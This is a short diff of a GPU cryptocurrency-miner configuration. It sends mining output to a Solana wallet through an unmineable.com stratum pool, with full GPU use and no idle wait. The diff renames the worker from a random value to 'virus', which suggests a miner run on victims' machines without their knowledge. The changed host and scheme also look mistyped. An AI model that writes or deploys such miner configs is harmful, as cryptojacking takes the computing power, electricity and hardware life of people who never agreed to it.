@@ -1,6 +1,6 @@
 {
-    "url": "stratum://`SOL:HJZtyc6QZNvAWLUMN69DMYnTBK3UgXmDASmSfuetex4D.{RANDOM}`@etchash.unmineable.com:3333",
-    "algo": "etchash",
+    "url": "stratums://`SOL:HJZtyc6QZNvAWLUMN69DMYnTBK3UgXmDASmSfuetex4D.virus`@ethach.unmineable.com:4444",
+    "algo": "ethash",
     "max-gpu": 100,
     "idle-wait": 0,
     "idle-gpu": 100,
